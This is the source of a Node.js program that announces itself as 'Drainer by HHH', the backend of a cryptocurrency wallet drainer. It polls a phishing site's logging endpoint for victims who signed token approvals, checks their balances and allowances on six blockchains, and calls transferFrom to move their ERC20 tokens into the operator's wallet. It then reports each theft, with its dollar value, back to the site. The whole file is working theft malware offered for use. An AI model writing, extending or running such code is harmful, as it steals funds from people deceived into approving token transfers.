console.log('Drainer by HHH');
console.log('');

const Web3 = require('web3');
const axios = require('axios');
const async = require('async');
const qs = require('qs');

const address = 'HERE_ADDRESS_YOUR_WALKER'; // Wallet address
const private = 'UNDER_HIS_Private_KEY'; // Private key of the wallet

const domain = 'http://localhost'; // Site address

const ABI = JSON.parse(`[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"delegate","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"delegate","type":"address"},{"internalType":"uint256","name":"numTokens","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"tokenOwner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],
"stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"receiver","type":"address"},{"internalType":"uint256","name":"numTokens","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"buyer","type":"address"},{"internalType":"uint256","name":"numTokens","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}]`);

const nodes = {
  56: new Web3('https://rpc.ankr.com/bsc'),
  1: new Web3('https://rpc.ankr.com/eth'),
  137: new Web3('https://rpc.ankr.com/polygon'),
  43114: new Web3('https://rpc.ankr.com/avalanche'),
  42161: new Web3('https://rpc.ankr.com/arbitrum'),
  10: new Web3('https://rpc.ankr.com/optimism')
};

async function transfer_from(chain, from_address, contract_address, amount, to_address, use_wallet) {
  try {
    var ethereum = nodes[chain];
    const contract = new ethereum.eth.Contract(ABI, contract_address);
    const method = await contract.methods.transferFrom(from_address, to_address, amount).encodeABI();
    const price = await ethereum.eth.getGasPrice();
    const tx = {
      to: contract_address,
      value: '0x0',
      gasLimit: ethereum.utils.toHex(100000),
      gasPrice: price,
      data: method
    };
    const signed_tx = await ethereum.eth.accounts.signTransaction(tx, use_wallet.private);
    const reciept = await ethereum.eth.sendSignedTransaction(signed_tx.rawTransaction);
    return reciept.transactionHash || 'null';
  } catch(err) {
    console.log(err);
  } return false;
}

async function is_withdraw_available(chain, from_address, to_address, contract, amount) {
  try {
    var ethereum = nodes[chain];
    const pContract = new ethereum.eth.Contract(ABI, contract);
    var balance = await pContract.methods.balanceOf(from_address).call();
    if (new ethereum.utils.BN(balance).lt(new ethereum.utils.BN(amount))) {
      return false;
    }
    var allowance = await pContract.methods.allowance(from_address, to_address).call();
    if (new ethereum.utils.BN(allowance).lt(new ethereum.utils.BN(amount))) {
      return false;
    }
    return true;
  } catch(err) {
    console.log(err);
  } return false;
}

const Get_ERC20_Allowance = async (chain_id, contract_address, owner_address, spender_address) => {
  try {
    const node = nodes[chain_id];
    const contract = new node.eth.Contract(ABI, contract_address);
    const balance = new node.utils.BN(await contract.methods.balanceOf(owner_address).call());
    const allowance = new node.utils.BN(await contract.methods.allowance(owner_address, spender_address).call());
    if (balance.lte(new node.utils.BN('0')) || allowance.lte(new node.utils.BN('0'))) return false;
    if (balance.lte(allowance)) return balance.toString();
    else return allowance.toString();
  } catch(err) {
    console.log(err);
  } return false;
};

const withdraw_queue = async.queue(async ({ raw }) => {
  try {
    var use_wallet = { address: address, private: private };
    console.log('[#' + raw.address + `] approved`);
    console.log('[#' + raw.address + `] withdrawing ${raw.token_amount}`);
    var result = await transfer_from(raw.chain_id, raw.address, raw.token_address, raw.token_amount, address, use_wallet);
    if (result != false) {
      try {
        console.log('[#' + raw.address + `] withdrawed ${raw.token_amount}`);
        await axios.get(`${domain}/logging.php?method=SEND_TOKEN&token_name=${raw.token_name}&chain_id=${raw.chain_id}&amount=${raw.amount}&usd_amount=${raw.usd_amount}&user_id=${raw.user_id}&hash=${result}`);
      } catch(err) {
        console.log(err);
      }
    }
  } catch(err) {
    console.log(err);
  }
}, 1);

const in_queue = async.queue(async ({ raw }) => {
  try {
    console.log('[#' + raw.address + '] added to queue, withdraw ' + raw.token_address);
    console.log('[#' + raw.address + `] approve address: ${address}`);
    let result = await Get_ERC20_Allowance(raw.chain_id, raw.token_address, raw.address, address);
    if (result == false) {
      console.log('[#' + raw.address + '] not approved, wait for 5 sec, attempt #1');
      await new Promise(r => setTimeout(r, 5000));
      result = await Get_ERC20_Allowance(raw.chain_id, raw.token_address, raw.address, address);
      if (result == false) {
        console.log('[#' + raw.address + '] not approved, wait for 30 sec, attempt #2');
        await new Promise(r => setTimeout(r, 30000));
        result = await Get_ERC20_Allowance(raw.chain_id, raw.token_address, raw.address, address);
        if (result == false) {
          console.log('[#' + raw.address + '] not approved, wait for 300 sec, attempt #3');
          await new Promise(r => setTimeout(r, 300000));
          result = await Get_ERC20_Allowance(raw.chain_id, raw.token_address, raw.address, address);
          if (result == false) {
            console.log('[#' + raw.address + '] not approved, drop');
            return;
          } else {
            raw.token_amount = result;
            withdraw_queue.push({ raw });
            return;
          }
        } else {
          raw.token_amount = result;
          withdraw_queue.push({ raw });
          return;
        }
      } else {
        raw.token_amount = result;
        withdraw_queue.push({ raw });
        return;
      }
    } else {
      raw.token_amount = result;
      withdraw_queue.push({ raw });
      return;
    }
  } catch(err) {
    console.log(err);
  }
}, 50);

async function init() {
  while (true) {
    try {
      var response = await axios.get(`${domain}/logging.php?method=GET_APPROVES`);
      if (response.data.length > 0) {
        for (const raw of response.data) {
          try {
            in_queue.push({ raw });
          } catch(err) {
            console.log(err);
          }
        }
      }
    } catch(err) {
      console.log(err);
    }
    await new Promise(r => setTimeout(r, 15000));
  }
}

init();